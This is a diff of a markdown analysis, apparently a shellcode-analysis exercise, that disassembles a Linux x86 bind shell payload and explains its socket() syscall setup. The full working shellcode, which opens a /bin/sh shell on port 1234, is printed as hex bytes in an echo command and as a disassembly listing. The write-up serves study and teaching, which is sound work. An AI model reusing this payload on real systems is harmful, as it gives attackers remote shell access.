@@ -89,34 +89,34 @@ For our analyzes, we will use ndisasm software. To do this, call our shellcode w
 $ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -u -
 ```
 ```nasm
-00000000  31DB              xor ebx,ebx			; clearing the EBX register
-00000002  F7E3              mul ebx 			; clearing the EAX and EDX registers
-00000004  53                push ebx 			; pushing 0 on the stack as a first argument of socketcall syscall (IPPROTO_IP = 0 (null))
-00000005  43                inc ebx 			; incrementing EBX by one for sys_socket call
-00000006  53                push ebx 			; pushing second argument on the stack (SOCK_STREAM = 1)
-00000007  6A02              push byte +0x2 		; pushing value 2 on the stack (third argument of socketcall syscall - AF_INET = 2 (PF_INET))
-00000009  89E1              mov ecx,esp			; directing the stack pointer to sys_socket() function arguments
-0000000B  B066              mov al,0x66 		; call to socketcall syscall 
-0000000D  CD80              int 0x80			; syscall execution (after this, sockfd will be saved in EAX as return value)
-0000000F  5B                pop ebx 			; popping value 2 into the ebx (sys_bind call)
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  53                push ebx 
+00000005  43                inc ebx
+00000006  53                push ebx 
+00000007  6A02              push byte +0x2
+00000009  89E1              mov ecx,esp
+0000000B  B066              mov al,0x66 
+0000000D  CD80              int 0x80
+0000000F  5B                pop ebx 
 00000010  5E                pop esi
-00000011  52                push edx 			; pushing 0 (null) which is necessary for that call
-00000012  68020004D2        push dword 0xd2040002	; pushing d204 -> in reverse 04d2(hex) = 1234(dec) - our LPORT, and 0002(hex) = 2(dec) which is the third argument (it is like `push word 2` - AF_INET = 2)
-00000017  6A10              push byte +0x10 		; pushing value 16, which is the socklen_t addrlen (size) = 16
-00000019  51                push ecx 			; const struct sockaddr *addr - stack pointer with struct arguments	
-0000001A  50                push eax 			; pushing our sockfd pointer
-0000001B  89E1              mov ecx,esp 		; directing the stack pointer to sys_bind() function arguments
-0000001D  6A66              push byte +0x66 		; pushing call to socketcall syscall on top of the stack
-0000001F  58                pop eax 			; popping above value into EAX
-00000020  CD80              int 0x80 			; syscall execution
-00000022  894104            mov [ecx+0x4],eax 		; ECX points to the stack, so ECX+4 will points too -> pushing EAX on the stack
-00000025  B304              mov bl,0x4 			; moving 4 to EBX (sys_listen call)
-00000027  B066              mov al,0x66 		; call to socketcall syscall 
-00000029  CD80              int 0x80 			; syscall execution
-0000002B  43                inc ebx 			; incrementing EBX (sys_accept call)
-0000002C  B066              mov al,0x66 		; call to socketcall syscall
-0000002E  CD80              int 0x80 			; syscall execution (ECX already points to top of the stack (arguments))
-00000030  93                xchg eax,ebx 		; 
+00000011  52                push edx 
+00000012  68020004D2        push dword 0xd2040002
+00000017  6A10              push byte +0x10 
+00000019  51                push ecx 
+0000001A  50                push eax 
+0000001B  89E1              mov ecx,esp 
+0000001D  6A66              push byte +0x66 
+0000001F  58                pop eax 
+00000020  CD80              int 0x80 
+00000022  894104            mov [ecx+0x4],eax 
+00000025  B304              mov bl,0x4 	
+00000027  B066              mov al,0x66 	
+00000029  CD80              int 0x80 	
+0000002B  43                inc ebx 
+0000002C  B066              mov al,0x66 
+0000002E  CD80              int 0x80 	
+00000030  93                xchg eax,ebx 		
 00000031  59                pop ecx
 00000032  6A3F              push byte +0x3f
 00000034  58                pop eax
@@ -132,6 +132,69 @@ $ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e
 0000004A  B00B              mov al,0xb
 0000004C  CD80              int 0x80
 ```
+------------------------------------------------------------------------------------------------------------------------
+
+The analysis of this shellcode will be divided into six parts, corresponding to the system calls called. 
+
+###socket()###
+```nasm
+00000000  31DB           xor ebx,ebx					
+00000002  F7E3           mul ebx 				
+00000004  53             push ebx 					
+00000005  43             inc ebx 				
+00000006  53             push ebx 				
+00000007  6A02           push byte +0x2 			
+00000009  89E1           mov ecx,esp 				
+0000000B  B066           mov al,0x66 				
+0000000D  CD80           int 0x80				
+```
+At the beginning a socket is prepared, which will serve as the interface on which the bind shell will listen for the connection. For this purpose, socket() syscall is used, called from socketcall()) syscall, taking the following arguments as components:
+- socket(AF_INET, SOCK_STREAM, IPPROTO_IP). 
+
+An interesting fact is that in the case of the whole shellcode,  socket(), bind(), listen(), accept() and dup2() syscalls are called from the same, repeated socketcall() syscall.
+
+For this purpose, the EBX, EAX and EDX registers are first cleaned. Using the mul instruction reduces the shellcode length by 1.
+```nasm
+00000000  31DB              xor ebx,ebx					
+00000002  F7E3              mul ebx
+```
+Then, in the reverse order, the values of the above arguments are thrown onto the stack. In order:
+- The value 0 is pushed on the stack (IPPROTO_IP = 0)
+```nasm
+00000004  53                push ebx
+``` 					
+- EBX is incremented so that you can use it both when calling socket() (sys_socket = 1), and by placing the second argument on the stack
+```nasm
+00000005  43                inc ebx 
+```				
+- Value 1 is pushed on the stack (SOCK_STREAM = 1)
+```nasm
+00000006  53                push ebx 	
+```			
+- Value 2 is pushed on the stack (AF_INET = 2)
+```nasm
+00000007  6A02              push byte +0x2 
+```			
+- Stack pointer (ESP) is directed to the arguments of the socket() system call
+```nasm
+00000009  89E1              mov ecx,esp 
+```				
+- Socketcall() syscall is called, creating socket with our socket() syscall - sockfd
+```nasm
+0000000B  B066              mov al,0x66 
+```				
+- After syscall, the sockfd address will be stored in the EAX registry 
+```nasm
+0000000D  CD80              int 0x80	
+```			
+------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
 ```bash
 $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
 #define __NR_socketcall 102
